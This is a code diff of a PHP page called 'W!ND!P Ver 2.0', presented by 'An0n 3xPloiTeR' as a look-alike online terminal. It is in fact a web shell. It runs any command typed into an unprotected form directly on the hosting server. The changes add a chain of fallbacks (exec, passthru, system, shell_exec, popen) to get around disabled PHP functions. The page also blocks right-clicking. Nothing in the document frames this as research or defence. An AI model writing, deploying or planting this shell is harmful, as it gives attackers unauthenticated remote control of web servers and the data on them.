@@ -1,18 +1,23 @@
-<!--
-								Everything Written By An0n 3xPloiTeR :)
-											Give a Visit :D
-							https://www.google.com/search?q=An0n 3xPloiTeR
--->
+<?php
+/*
+
+An Online Look-A-Like Terminal By An0n 3xPloiTeR ^_^
+Editing Name Wont Make You The Author
+#Respect #Coderz
+
+*/
+?>
 <!DOCTYPE html>
 <html lang="en">
 	<head>
-		<title>W!ND!P Ver 2.0</title>
+		<title>W!ND!P Ver 2.0 ~ An0n 3xPloiTeR</title>
 		<meta charset="UTF-8" />
 		<meta name="content" content="W!ND!P Ver 2.0" />
 		<meta name="author" content="An0n 3xPloiTeR, Umar Arfeen Shah" />
 		<meta name="about" content="Made By An0n 3xPloiTeR" />
 		<meta name="description" content="Itx a Online Look a Like Terminal :D" />
 		<meta name="revised" content="W!ND!P Ver 2.0, 01/05/2017" />
+		<meta content='width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1' name='viewport'/>
 		<meta http-equiv="refresh" content="" /><!-- For refreshing page after ___ intervals of time -->
 		<script language="Javascript1.2">
 			function njs_nodroit() {
@@ -28,7 +33,7 @@
 				background-color: black;
 			}
 			textarea {
-				color: lawngreen;
+				color: white;
 				background-color: black; 
 				font-family: Comic Sans Ms; 
 				font-size: 100%;
@@ -78,19 +83,6 @@
 				text-align: center;
 				top: 11vh;
 			}
-			.footer {
-				position: fixed;
-				bottom: 5px;
-				left: 0px;
-				right: 0px;
-				color: white;
-				font-family: Comic Sans Ms;
-				font-size: 120%;
-				text-align: center;
-			}
-			#input.1 {
-				asdasd
-			}
 		</style>
 	</head>
 	<body>
@@ -98,29 +90,43 @@
 			<font>W!ND!P Ver 2.0</font>
 		</div>
 		<div class="results">
-			<textarea placeholder="Results Will Appeare Here :)" type="text" name="results" rows="25" cols="153"><?php
+			<textarea placeholder="Results Will Appeare Here :)" type="text" name="results" rows="20" cols="160%"><?php
 				if (isset($_POST['input'])) {
 				$input = htmlspecialchars($_POST['input']);
 				$host = $_SERVER['HTTP_HOST'];
 				$computername = gethostname();
-				$results = $computername." @ ".$host." ~ ".shell_exec($input);
-				echo $results;
-				} 
-				else {
-					echo "Type Something in Commands Here Box :D";
+				function execute($in) {
+				    $out = '';
+				    if(function_exists('exec')) {
+				        @exec($in,$out);
+				        $out = @join("\n",$out);
+				    } elseif(function_exists('passthru')) {
+				        ob_start();
+				        @passthru($in);
+				        $out = ob_get_clean();
+				    } elseif(function_exists('system')) {
+				        ob_start();
+				        @system($in);
+				        $out = ob_get_clean();
+				    } elseif(function_exists('shell_exec')) {
+				        $out = shell_exec($in);
+				    } elseif(is_resource($f = @popen($in,"r"))) {
+				        $out = "";
+				        while(!@feof($f))
+				            $out .= fread($f,1024);
+				        pclose($f);
+				    }
+				    return $out;
 				}
-			?>
-			</textarea>
+				$results = $computername." @ ".$host." ~ ".execute($input);
+				echo $results;
+				}
+			?></textarea>
 		</div>
 		<div class="input">
 			<form action="" method="POST">
 				<input type="text" name="input" placeholder="Commands Here" size="115" />
 			</form>
-		</div>
-		<div class="footer">
-		<footer>
-			<input style="font-size: 80%;" type="submit" value="Developed By An0n 3xPloiTeR">
-		</footer>
 		</div>
 	</body>
 </html>
